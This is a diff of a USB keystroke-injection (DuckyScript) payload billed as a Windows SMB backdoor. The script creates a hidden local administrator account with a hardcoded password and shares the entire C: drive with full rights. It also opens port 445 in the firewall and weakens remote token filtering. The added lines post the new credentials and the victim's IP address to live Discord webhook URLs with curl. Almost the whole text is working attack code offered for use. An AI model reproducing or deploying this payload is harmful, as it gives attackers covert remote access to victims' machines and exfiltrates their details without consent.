@@ -2,15 +2,15 @@ REM #
 REM # Title:            "Microsoft Windows" SMB Backdoor
 REM #
 REM # Description:      
-REM #                   1) Adds a user account (RD_User:RD_P@ssW0rD).
+REM #                   1) Adds a user account (f1ch3u5:passw@rd).
 REM #                   2) Adds this local user to local administrator group.
 REM #                   3) Shares "C:" directory (RD_SHARE).
 REM #                   4) Adds a rule to the firewall.
 REM #                   5) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
 REM #                   6) Hides this user account.
 REM #
-REM # Author:           TW-D
-REM # Version:          1.0
+REM # Author:           F1CH3U5
+REM # Version:          5.0
 REM # Category:         Remote Access
 REM # Target:           Microsoft Windows
 REM #
@@ -26,7 +26,7 @@ REM #
 
 REM ######## INITIALIZATION ########
 
-DELAY 2000
+DELAY 1000
 
 REM ######## STAGE1 ########
 
@@ -37,53 +37,56 @@ DELAY 3000
 CTRL-SHIFT ENTER
 DELAY 3000
 LEFTARROW
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 
 REM ######## STAGE2 ########
 
-STRING NET USER RD_User RD_P@ssW0rD /ADD
+STRING NET USER f1ch3u5 passw@rd /ADD
 ENTER
-DELAY 2000
+DELAY 1000
 
-STRING NET LOCALGROUP Administradores RD_User /ADD
+STRING NET LOCALGROUP Administradores f1ch3u5 /ADD
 ENTER
-DELAY 2000
+DELAY 1000
 
 REM ######## STAGE3 ########
 
-STRING NET SHARE RD_SHARE=C:\ /GRANT:RD_User,FULL /REMARK:"RRemote DShare"
+STRING NET SHARE RD_SHARE=C:\ /GRANT:f1ch3u5,FULL /REMARK:"RRemote DShare"
 ENTER
-DELAY 2000
+DELAY 1000
 
 STRING NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Server Message Block for RD" PROTOCOL=TCP LOCALPORT=445 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
 ENTER
-DELAY 2000
+DELAY 1000
 
 REM ######## STAGE4 ########
 
 STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
 ENTER
-DELAY 2000
+DELAY 1000
 
-STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v RD_User /t REG_DWORD /d 0
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v f1ch3u5 /t REG_DWORD /d 0
 ENTER
-DELAY 2000
-STRING echo "Dispositivo POWNED user: RD_User passw: RD_P@ssW0rD" > mensaje.txt
+DELAY 1000
+STRING echo "Dispositivo POWNED user: f1ch3u5 passw: passw@rd" > mensaje.txt
 ENTER
 
-DELAY 2000
-STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@mensaje.txt" https://discord.com/api/webhooks/1196971918759313598/yIrrXm509i0oQ2jxCYal9Gmd1Yk3xXPVnWkWiA3Qllf6NXEoO2OpO6U-3pC003bRArBN
-DELAY 2000
-STRING ipconfig /all > ipconfig_output.txt
 DELAY 500
-STRING curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"`type ipconfig_output.txt`\"}" https://discord.com/api/webhooks/1207062200095875102/diaPuook-9Z728ovC_M8Pwt70NIryHV6siM973SeOGhsMLyK6jbk0TIudNI12ryvEF_3
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@mensaje.txt" https://discord.com/api/webhooks/1207070011911573655/wPa1jrvnGusQ5vfh9TGB2qtNdwbuvgRqnnEP31UbROyoRJjyg_YrC_HhH2wNuY3MI7LV
 DELAY 500
 ENTER
+DELAY 1000
+
+STRING for /f "tokens=2 delims=:" %i in ('ipconfig ^| findstr /i "IPv4"') do @set ip=%i && curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"IP de la interfaz WiFi es: %ip%\"}" https://discord.com/api/webhooks/1207070011911573655/wPa1jrvnGusQ5vfh9TGB2qtNdwbuvgRqnnEP31UbROyoRJjyg_YrC_HhH2wNuY3MI7LV
+DELAY 500
+ENTER
+DELAY 1500
+
 
 ENTER
-DELAY 2000
+DELAY 1000
 
 REM ######## FINISH ########
 
